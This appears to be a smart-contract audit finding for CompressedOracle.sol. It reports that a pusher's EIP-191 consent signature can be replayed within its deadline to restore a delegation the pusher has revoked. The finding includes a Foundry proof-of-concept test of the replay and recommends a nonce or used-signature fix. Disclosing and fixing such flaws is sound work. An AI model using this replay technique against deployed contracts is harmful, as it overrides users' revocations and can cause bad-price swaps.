### Title
Pusher Consent Signature Replay After `revokePusher()` Permanently Re-establishes Revoked Delegation Within Deadline Window — (`File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracle.allowPushers` accepts a pusher's EIP-191 consent signature and sets `namespaceRemapping[pusher] = creator`. There is no nonce and no used-signature registry. After a pusher calls `revokePusher()` to clear the mapping, any party holding the original signature can replay it (before its `deadline`) to silently re-establish the delegation. The protocol's own NatSpec acknowledges the deadline is the only guard against post-revocation replay, but the deadline only prevents replay *after* it expires — not within the window.

---

### Finding Description

`allowPushers` signs over `(chainid, address(this), deadline, pusher, creator)`:

```solidity
// CompressedOracle.sol
function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(pusher == ECDSA.recover(hash, signatures[i]));
    namespaceRemapping[pusher] = msg.sender;   // ← overwrites unconditionally
    emit PusherAuthorized(pusher, msg.sender);
}
```

`_ensureDeadline` only checks `block.timestamp <= deadline`. There is no mapping of used signatures, no nonce, and no check that `namespaceRemapping[pusher]` is already zero before writing.

`revokePusher` clears the mapping:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
```

**Attack sequence:**

1. Pusher signs consent for creator with `deadline = now + 30 days`.
2. Creator calls `allowPushers` → `namespaceRemapping[pusher] = creator`.
3. Pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator (or any third party holding the signature) calls `allowPushers` again with the *identical* parameters before `deadline` → `namespaceRemapping[pusher] = creator` is restored.
5. Steps 3–4 can repeat indefinitely until `deadline` expires.

The NatSpec comment on `allowPushers` explicitly acknowledges the risk but treats the deadline as a complete fix:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."*

The deadline is only a partial mitigation: it bounds the replay window but does not close it.

---

### Impact Explanation

Every push the pusher makes while the delegation is active lands in the **creator's namespace**, not the pusher's own. If the pusher:

- Revokes to stop contributing to the creator's namespace and begins pushing to their own namespace (e.g., to serve their own pool), the creator replays the signature and the pusher's data is silently redirected back to the creator's namespace.
- The pusher's own namespace remains at price = 0 / timestamp = 0, which every consumer rejects as stale.
- Any pool whose price provider reads from the pusher's namespace receives a stale/zero oracle quote → **bad-price execution** on live swaps.

The pusher's only recourse is to stop pushing entirely until the deadline expires, which may be weeks away.

---

### Likelihood Explanation

Low-to-medium. Requires a creator who (a) holds the original signature bytes and (b) has an incentive to keep the delegation active against the pusher's will (e.g., the pusher is a high-quality data source the creator does not want to lose). The replay call is permissionless and costs only gas.

---

### Recommendation

Track each consumed signature to prevent replay. The minimal fix is a `mapping(bytes32 => bool) public usedDelegationSignatures` keyed on the signature hash, checked and set inside `allowPushers`:

```solidity
bytes32 sigHash = keccak256(signatures[i]);
require(!usedDelegationSignatures[sigHash], "signature already used");
usedDelegationSignatures[sigHash] = true;
```

Alternatively, include a per-pusher nonce in the signed payload so the pusher can invalidate all outstanding signatures by incrementing their nonce:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender, pusherNonce[pusher]))
```

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// Foundry test sketch
function test_replay_after_revoke() public {
    uint256 deadline = block.timestamp + 30 days;

    // 1. Pusher signs consent for creator
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, hash);
    bytes memory sig = abi.encodePacked(r, s, v);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // 2. Creator establishes delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // 3. Pusher revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // 4. Creator replays the SAME signature — delegation re-established
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);  // succeeds, no revert
    assertEq(oracle.namespaceRemapping(pusher), creator); // ← revocation undone
}
``` [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-212)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L236-243)
```text
    /// @notice Allows a pusher to self-revoke their delegation. After revocation the
    ///         wallet pushes into its OWN namespace again (the registrationless default).
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```
